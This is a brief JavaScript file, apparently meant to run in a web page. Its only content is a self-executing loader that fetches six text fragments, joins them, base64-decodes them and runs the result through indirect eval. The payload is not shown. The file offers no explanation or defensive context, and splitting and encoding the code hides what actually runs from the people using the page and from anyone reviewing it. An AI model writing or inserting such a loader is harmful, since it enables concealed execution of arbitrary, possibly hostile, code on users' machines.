(async function(){
  const p0=await fetch('g1.txt').then(r=>r.text());
  const p1=await fetch('g2.txt').then(r=>r.text());
  const p2=await fetch('g3.txt').then(r=>r.text());
  const p3=await fetch('g4.txt').then(r=>r.text());
  const p4=await fetch('g5.txt').then(r=>r.text());
  const p5=await fetch('g6.txt').then(r=>r.text());
  const bin=Uint8Array.from(atob(p0+p1+p2+p3+p4+p5),c=>c.charCodeAt(0));
  (0,eval)(new TextDecoder().decode(bin));
})();
